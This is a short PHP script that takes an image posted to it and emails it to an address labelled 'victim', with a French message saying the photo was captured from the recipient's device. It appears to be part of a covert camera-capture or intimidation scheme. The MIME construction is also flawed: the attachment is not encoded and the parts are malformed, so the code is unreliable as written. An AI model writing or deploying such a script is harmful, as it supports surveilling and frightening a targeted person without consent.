<?php
$to = "victim@example.com";
$subject = "Photo de votre appareil";
$message = "Voici une photo capturée à partir de votre appareil.";
$headers = "From: dan@example.com";
$image = $_POST['image'];

$boundary = md5(time());
$headers .= "\nMIME-Version: 1.0\n" .
    "Content-Type: multipart/mixed;\n" .
    " boundary=" . $boundary . "\n";
$message .= "--" . $boundary . "\n" .
    "Content-Type: image/jpeg;\n" .
    " name=\"photo.jpg\"\n" .
    "Content-Disposition: attachment;\n" .
    " filename=\"photo.jpg\"\n\n" .
    $image . "\n\n" .
    "--" . $boundary . "--";

mail($to, $subject, $message, $headers);
?>